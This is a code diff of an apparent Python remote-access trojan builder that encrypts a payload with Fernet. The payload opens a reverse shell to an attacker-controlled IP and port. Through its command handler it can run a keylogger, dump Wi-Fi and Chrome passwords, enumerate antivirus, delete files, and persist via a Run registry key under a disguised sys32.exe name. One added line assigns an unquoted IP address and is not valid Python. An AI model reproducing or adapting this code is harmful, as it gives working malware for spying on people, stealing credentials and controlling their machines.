@@ -1,4 +1,10 @@
 from cryptography.fernet import Fernet
+
+
+# Now you can access the IP address and port number as arguments
+ip_address = 192.168.0.240
+port_number = 8889
+
 code = b"""
 import base64
 import socket
@@ -271,12 +277,11 @@ def downloadurl(url):
     with open (file_name, 'wb') as output_file:
         output_file.write(jod_url.content)
 
-
 def connection():
     while True:
         time.sleep(5)
         try:
-            connection_to_attacker.connect(("192.168.0.242", 8081))
+            connection_to_attacker.connect(("192.168.0.239", 8081))
             shell()
             connection_to_attacker.close()
             break
@@ -284,246 +289,258 @@ def connection():
             connection()
 
 def shell():
-    while True:
-        command = reliable_recv()
-        if command == 'terminate':
-            connection_to_attacker.close()
-            break
-        elif command == 'clear':
-            pass
-        elif command[:3] == 'cd ':
-            try:
-                os.chdir(command[3:])
-                file = os.getcwd()
-                files = str(file)
-                reliable_send(files)
-            except:
+    try:
+        while True:
+            command = reliable_recv()
+            if command == 'terminate':
+                connection_to_attacker.close()
+                break
+            elif command == 'clear':
                 pass
-        elif command == 'pwd':
-            try:
-                files = os.getcwd()
-                files = str(files)
-                reliable_send(files)
-            except:
-                pass
-        elif command[:9] == 'download ':
-            upload_file(command[9:])
-
-        elif command[:7] == 'upload ':
-            download_file(command[7:])
-
-        elif command == 'user':
-            try:
-                detail = os.getlogin()
-                detail = str(detail)
-                reliable_send(detail)
-            except:
-                pass
-        elif command == 'info':
-            try:
-                execute = subprocess.run("systeminfo", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout.decode() + execute.stderr.decode()
-                #result = result.decode()
-                reliable_send(result)
-            except:
-                pass
-
-        elif command == 'service':
-            try:
-                execute = subprocess.run("net start", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout.decode()+ execute.stderr.decode()
-                #result = result.decode()
-                reliable_send(result)
-            except:
-                pass
-
-        elif command == 'help':
-            pass
-
-        elif command[:5] == 'start':
-            try:
-                subprocess.Popen(command[6:], shell=True)
-                reliable_send("Program Started")
-            except:
-                reliable_send("Failed To Start The Program")
-
-        elif command == 'env':
-            try:
-                execute = subprocess.run(['powershell', 'Get-Childitem -path env:'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout + execute.stderr
-                result = result.decode()
-                reliable_send(result)
-            except:
-                pass
-
-        elif command == 'av':
-            try:
-                execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av', '/s'], shell=True, stdout=subprocess.PIPE, 
-                                         stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout + execute.stderr
-                result = result.decode()
-                #print(result)
-                reliable_send(result)
-            except:
-                pass
-
-
-        elif command == 'allapps':
-            try:
-                execute = subprocess.run(['powershell', 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Vendor, Version'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout + execute.stderr
-                result = result.decode()
-                reliable_send(result)
-            except:
-                pass
-
-
-        elif command == 'python_install':
-            try:
-                execute = subprocess.run("curl https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe --output python-3.10.2-amd64.exe && python-3.10.2-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                result = execute.stdout.decode()+ execute.stderr.decode()
-                #result = result.decode()
-                reliable_send(result)
-            except:
-                pass
-
-
-        elif command[:8] == 'get':
-            try:
-                downloadurl(command[3:])
-                reliable_send("Downloaded")
-            except:
-                reliable_send("Not Downloaded")
-
-
-
-        elif command == 'keylogger':
-                
-
+            elif command[:3] == 'cd ':
                 try:
-                    t1 = threading.Thread(target=start_log)
-                    t1.start()
-                    
+                    os.chdir(command[3:])
+                    file = os.getcwd()
+                    files = str(file)
+                    reliable_send(files)
+                except:
+                    pass
+            elif command == 'pwd':
+                try:
+                    files = os.getcwd()
+                    files = str(files)
+                    reliable_send(files)
+                except:
+                    pass
+            elif command[:9] == 'download ':
+                upload_file(command[9:])
+
+            elif command[:7] == 'upload ':
+                download_file(command[7:])
+
+            elif command == 'user':
+                try:
+                    detail = os.getlogin()
+                    detail = str(detail)
+                    reliable_send(detail)
+                except:
+                    pass
+            elif command == 'info':
+                try:
+                    execute = subprocess.run("systeminfo", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                    result = execute.stdout.decode() + execute.stderr.decode()
+                    #result = result.decode()
+                    reliable_send(result)
+                except:
+                    pass
+
+            elif command == 'service':
+                try:
+                    execute = subprocess.run("net start", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                    result = execute.stdout.decode()+ execute.stderr.decode()
+                    #result = result.decode()
+                    reliable_send(result)
+                except:
+                    pass
+
+            elif command == 'help':
+                pass
+
+            elif command[:5] == 'start':
+                try:
+                    subprocess.Popen(command[6:], shell=True)
+                    reliable_send("Program Started")
+                except:
+                    reliable_send("Failed To Start The Program")
+
+            elif command == 'env':
+                try:
+                    execute = subprocess.run(['powershell', 'Get-Childitem -path env:'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                    result = execute.stdout + execute.stderr
+                    result = result.decode()
+                    reliable_send(result)
+                except:
+                    pass
+
+            elif command == 'av':
+                try:
+                    execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av', '/s'], shell=True, stdout=subprocess.PIPE, 
+                                             stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                    result = execute.stdout + execute.stderr
+                    result = result.decode()
+                    #print(result)
+                    reliable_send(result)
                 except:
                     pass
 
 
-
-        elif command == 'dump_keylogger':
-
-                local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
-                direc="temp"
-                dir=os.path.join(local_state_path,direc)
-
-                hellfile=dir+"\\hellfile.txt"
-                fn=open(hellfile,"r")
-                reliable_send(fn.read())
-
-                fn.close()
-
-        #working but first need to stop the thread don't know how
-        elif command == 'del_keylogger_file':
-            dir=os. getcwd() 
-            hellfile=dir+"\hellfile.txt"
-            if os.path.exists(hellfile):
-                print("yes")
-                os.remove(hellfile)
-            else:
-                print(hellfile)
-                print("No")
-
-#to stop thread
-        elif command == 'stop_keylogger':
-            time.sleep(0.5)
-            t1.terminate()
-            print("Killed sucessfully")
-            
-        elif command == 'wifi_password':
-            try:
-                wifi_password()
-                direc = os. getcwd()
-                filename = '\Wifi_pass.txt'
-                filename = direc+filename
-                fn=open(filename,"r")
-                reliable_send(fn.read())
-                fn.close()
-            except:
-                pass
-
-        elif command == 'chrome_pass_dump':
-            chrome_pass()
+            elif command == 'allapps':
+                try:
+                    execute = subprocess.run(['powershell', 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Vendor, Version'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                    result = execute.stdout + execute.stderr
+                    result = result.decode()
+                    reliable_send(result)
+                except:
+                    pass
 
 
-        elif command == 'privsec1':
-            try:
-                priv1()
-            except:
-                pass
+            elif command == 'python_install':
+                try:
+                    execute = subprocess.run("curl https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe --output python-3.10.2-amd64.exe && python-3.10.2-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    result = execute.stdout.decode()+ execute.stderr.decode()
+                    #result = result.decode()
+                    reliable_send(result)
+                except:
+                    pass
+
+
+            elif command[:8] == 'get':
+                try:
+                    downloadurl(command[3:])
+                    reliable_send("Downloaded")
+                except:
+                    reliable_send("Not Downloaded")
 
 
 
-        elif command == 'privsec2':
-            try:
-                priv2()
-            except:
-                pass
+            elif command == 'keylogger':
+                    
+
+                    try:
+                        t1 = threading.Thread(target=start_log)
+                        t1.start()
+                        
+                    except:
+                        pass
 
 
-        elif command == 'privsec3':
-            try:
-                priv3()
-            except:
-                pass
-                
-    
-        elif command == 'persistence1':
-            try:
-                persistent1()
-                reliable_send("persistence Achieved Via Method 1")
-            except:
-                reliable_send("persistence Not Achieved")
-                pass
 
-                 
+            elif command == 'dump_keylogger':
 
-        elif command == 'persistence2':
-            try:
-                destination = os.environ["appdata"] + "\\sys32.exe"
-                print(destination)
-                if not os.path.exists(destination):
-                    shutil.copyfile(sys.executable, destination)
-                    subprocess.run('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v GodGenesis /t REG_SZ /d "'+ destination + '"', shell=True)            
-                    reliable_send("persistence Achieved Via Method 2")
+                    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
+                    direc="temp"
+                    dir=os.path.join(local_state_path,direc)
+
+                    hellfile=dir+"\\hellfile.txt"
+                    fn=open(hellfile,"r")
+                    reliable_send(fn.read())
+
+                    fn.close()
+
+            #working but first need to stop the thread don't know how
+            elif command == 'del_keylogger_file':
+                dir=os. getcwd() 
+                hellfile=dir+"\hellfile.txt"
+                if os.path.exists(hellfile):
+                    print("yes")
+                    os.remove(hellfile)
                 else:
-                    reliable_send("Persistent Established Before")
-            except:
-                reliable_send("persistence Not Achieved")
-                pass
+                    print(hellfile)
+                    print("No")
+
+    #to stop thread
+            elif command == 'stop_keylogger':
+                time.sleep(0.5)
+                t1.terminate()
+                print("Killed sucessfully")
+
+
+
                 
+            elif command == 'wifi_password':
+                try:
+                    wifi_password()
+                    direc = os. getcwd()
+                    filename = '\Wifi_pass.txt'
+                    filename = direc+filename
+                    fn=open(filename,"r")
+                    reliable_send(fn.read())
+                    fn.close()
+                except:
+                    pass
+
+            
 
 
+            elif command == 'chrome_pass_dump':
+                chrome_pass()
+
+
+                    
         
-        else:
-            try:
+            elif command == 'persistence1':
+                try:
+                    persistent1()
+                    reliable_send("persistence Achieved Via Method 1")
+                except:
+                    reliable_send("persistence Not Achieved")
+                    pass
+        
+            elif command[:5] == 'rmdir':
+                try:
+                    path = command[6:]
+                    shutil.rmtree(path)
+                    reliable_send(f"Deleted {path}")
+                except Exception as e:
+                    reliable_send(str(e))
 
-                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout.read() + execute.stderr.read()
-                result = result.decode()
-                reliable_send(result)
-            except:
-                pass
+            elif command[:2] == 'rm':
+                try:
+                    path=command[3:]
+                    os.remove(path)
+                    reliable_send(f"Deleted {path}")
+                except Exception as e:
+                    reliable_send(str(e))
 
+            elif command == 'persistence2':
+                try:
+                    destination = os.environ["appdata"] + "\\sys32.exe"
+                    print(destination)
+                    if not os.path.exists(destination):
+                        shutil.copyfile(sys.executable, destination)
+                        subprocess.run('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v GodGenesis /t REG_SZ /d "'+ destination + '"', shell=True)            
+                        reliable_send("persistence Achieved Via Method 2")
+                    else:
+                        reliable_send("Persistent Established Before")
+                except:
+                    reliable_send("persistence Not Achieved")
+                    pass
+            
+            
+            else:
+                try:
+
+                    execute = subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+                    stdout, stderr = execute.communicate(timeout=30)
+                    result = stdout + stderr
+                    result = result.decode()
+                    print("lol")
+                    reliable_send(result)
+                except subprocess.TimeoutExpired:
+                    reliable_send("Command timed out.")
+                    shell()
+                except:
+                    pass
+
+
+    except:
+        pass
 connection_to_attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
 
 
 """
+port_number = str(port_number)
+code = code.decode()
+code = code.replace("192.168.0.239",ip_address)
+code = code.replace("8081", port_number)
+code = code.encode()
+#print(code)
 key = Fernet.generate_key()
 encryption_type = Fernet(key)
 encrypted_message = encryption_type.encrypt(code)
